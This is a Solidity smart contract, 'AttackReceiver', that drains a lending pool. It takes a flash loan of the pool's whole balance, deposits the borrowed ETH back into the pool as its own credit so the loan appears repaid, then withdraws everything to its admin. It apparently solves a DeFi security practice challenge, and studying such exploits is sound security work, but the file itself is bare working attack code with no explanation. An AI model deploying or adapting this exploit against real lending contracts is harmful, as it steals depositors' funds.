// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ILenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256) external;
}

/**
 * @title AttackReceiver
 */
contract AttackReceiver {
    using Address for address payable;
    address immutable public admin;

    constructor() {
        admin = msg.sender;
    }

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function callFlashLoan(address pool, uint256 amount) public {
        ILenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        // deposit
        ILenderPool(msg.sender).deposit{value: msg.value}();
    }

    function withdraw(address pool) public {
        require(msg.sender == admin, "must be admin");
        ILenderPool(pool).withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    function attack(address pool) external {
        callFlashLoan(pool, pool.balance);
        withdraw(pool);
    }

    // able to receive ETH
    receive () external payable {}
}
 